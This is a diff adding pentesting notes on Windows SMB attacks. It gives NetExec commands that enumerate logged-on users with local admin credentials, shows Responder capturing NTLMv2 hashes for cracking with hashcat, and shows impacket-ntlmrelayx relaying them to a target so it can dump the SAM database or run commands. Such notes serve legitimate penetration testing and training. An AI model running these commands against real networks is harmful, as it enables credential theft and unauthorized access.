@@ -52,3 +52,50 @@ We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-u
 - [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
 - [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
 - [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.
+
+### NetExec (Formerly CrackMapExec)
+
+```ad-note
+For authentication on a non domain-joined machine, the **--local-auth** flag can be used.
+
+---
+
+If **--exec-method** is not defined, **atexec** method will be tried. If it fails we can try other methods by specifing **smbexec**
+```
+
+#### Enumerate Logged-On Users
+
+There are two ways to enumerate logged-on users:
+
+- `--loggedon-user`
+  
+```sh
+nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users
+```
+
+- `--qwinsta`
+  
+```sh
+nxc smb <ip> -u <localAdmin> -p <password> --qwinsta
+```
+
+## Forced Authentication Attacks
+
+We can capture user NTLMv2 hashes using `responder`
+
+```sh
+responder -I interface_name
+```
+
+After capturing the NTLMv2, we can crack it via hashcat using module `5600`
+
+If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.
+
+First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).
+
+Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.
+
+```sh
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+```
+
